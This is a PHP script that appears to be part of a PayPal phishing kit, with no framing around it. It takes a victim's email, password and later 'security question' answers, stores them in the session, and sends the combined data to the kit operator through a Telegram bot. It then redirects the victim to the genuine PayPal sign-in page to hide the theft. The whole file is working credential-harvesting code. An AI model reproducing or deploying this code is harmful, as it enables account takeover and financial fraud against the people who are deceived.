<?php
// This file receives the POST data if JavaScript fails
session_start();

if($_SERVER['REQUEST_METHOD'] == 'POST') {
    include 'bot.php';
    
    if(isset($_POST['email']) && isset($_POST['password']) && !isset($_POST['fullname'])) {
        // Login data
        $type = 'login';
        $_SESSION['login_data'] = $_POST;
        
        // Show security questions page
        header('Location: index.php?step=security');
        
    } elseif(isset($_POST['fullname'])) {
        // Security data
        $data = array_merge($_SESSION['login_data'] ?? [], $_POST);
        
        // Send to bot
        sendTelegram("⚠️ FALLBACK DATA CAPTURED\n" . print_r($data, true));
        
        // Redirect to real PayPal
        header('Location: https://www.paypal.com/signin');
    }
    exit;
}
?>